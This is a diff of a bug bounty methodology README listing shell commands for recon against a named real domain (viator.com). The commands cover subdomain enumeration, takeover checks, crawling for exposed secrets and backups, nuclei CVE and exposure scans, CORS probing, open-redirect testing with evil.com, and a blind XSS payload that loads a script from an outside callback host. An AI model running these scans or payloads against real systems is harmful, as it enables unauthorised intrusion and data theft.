@@ -1,82 +1,77 @@
 <h1>My Bug Bounty Hunting Methodology</h1>
 
 
-
-<h2>Recon :-</h2>
-
-
 ```bash
- assetfinder --subs-only vulncrax.com | anew | sudo httpx  -mc 200 -o live-subs.txt
+subfinder -d viator.com -all  -recursive > subdomain.txt
 ```
 
 ```bash
-cat live-subs.txt | sudo httpx -status-code -title -tech-detect -mc 200
-```
 
-
-```bash
-cat live-subs.txt | sudo  gau --threads 5 --o links.txt
-```
-
-
-
-```bash
-cat live-subs.txt | sudo dirsearch --stdin
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
 ```
 
 ```bash
-ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c true -v -o output.txt
-```
 
-
-
-<h2>Subdomain Takeover :-</h2>
-
-```bash
-nuclei -t /home/vulncrax/nuclei-templates/http/takeovers -l live-subs.txt
-```
-```bash
-subzy run --targets live-subs.txt
-```
-
-
-
-<h2>collecting urls and Parameters :</h2>
-
-
-
-```bash
-cat live-subs.txt | grep -i "="
-
-```
-<h2>finding  OpenRedireX </h2>
-
-```bash
-https://vulncrax.com/home?lang=de&returnUrl=https://evil.com/
-```
-
-
-
-<h2>Shodan Dorking :-</h2>
-
-```bash
-ssl.cert.subject.CN:"example.com*" 200
+katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 ```
 
 ```bash
-ssl.cert.subject.CN:"*.example.com" "230 login successful" port:"21"
-```
-```bash
-ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
+
+cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
 ```
 
 ```bash
-ssl:"target.com" http.title:"index of / "
+
+cat allurls.txt | grep -E "\.js$" >> js.txt
 ```
 
+```bash
 
+cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
+```
 
+```bash
 
+echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+```
+
+```bash
+
+dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+```
+
+```bash
+
+subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+```
+
+```bash
+subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+```
+
+```bash
+
+python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+```
+
+```bash
+
+nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
+```
+
+```bash
+
+nuclei  -list ~/vaitor/subdomains_alive.txt -tags cves,osint,tech
+```
+
+```bash
+
+cat allurls.txt | gf lfi | nuclei -tags lfi
+```
+
+```bash
+cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+```
 
 
 
